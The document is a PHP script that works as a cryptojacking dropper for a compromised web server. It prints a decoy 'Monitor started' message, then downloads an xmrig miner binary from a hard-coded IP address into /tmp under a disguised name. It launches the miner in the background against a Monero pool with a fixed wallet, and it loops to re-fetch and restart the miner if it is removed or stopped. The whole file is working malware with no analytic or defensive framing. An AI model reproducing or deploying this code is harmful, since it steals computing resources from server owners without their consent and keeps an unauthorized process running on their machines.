<?php
$c=['u'=>'http://93.177.77.204/d/','f'=>'stmept','k'=>'stmept','i'=>60,'a'=>'--url pool.supportxmr.com:3333 --user 8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK --pass laqi --donate-level 0','d'=>'/tmp/'];
$l=$c['d'].md5($c['f']).'.lock';$fp=fopen($l,"w+");if(!$fp||!flock($fp,LOCK_EX|LOCK_NB))die();
ignore_user_abort(true);set_time_limit(0);if(ob_get_level()>0)ob_end_clean();
echo "Success: Monitor started.";header("Content-Length: ".ob_get_length());header("Connection: close");flush();
if(function_exists('fastcgi_finish_request'))fastcgi_finish_request();
function x($m){$s=['exec','shell_exec','system','passthru'];foreach($s as $f){if(function_exists($f)){ob_start();$r=($f==='exec')?(exec($m,$o)?implode("\n",$o):""):$f($m);$v=ob_get_clean();return $r?:$v;}}return false;}
function dl($u,$p){if($f=@fopen($u,'r')){file_put_contents($p,$f);fclose($f);}elseif(function_exists('curl_init')){x("curl -skL -o ".escapeshellarg($p)." ".escapeshellarg($u));}else{x("wget -qO ".escapeshellarg($p)." ".escapeshellarg($u)." --no-check-certificate");}return(file_exists($p)&&filesize($p)>0);}
$a=strtolower(php_uname('m'));$t=$c['u'].'xmrig_86c3';if(strpos($a,'arm')!==false||strpos($a,'aarch64')!==false){$ld=x("ldd --version 2>&1");$t=$c['u'].(strpos($ld,'musl')!==false?'xmrig_m':'xmrig_g');}
$p=$c['d'].$c['f'];while(true){if(file_exists($c['d'].'stop_me')){@unlink($c['d'].'stop_me');break;}if(!file_exists($p)){if(dl($t,$p))chmod($p,0755);else{sleep($c['i']);continue;}}
$r=x("pgrep -f ".escapeshellarg($c['k']));if(empty(trim($r))){x("cd {$c['d']} && nohup ./".$c['f']." ".$c['a']." > /dev/null 2>&1 &");}sleep($c['i']);}flock($fp,LOCK_UN);fclose($fp);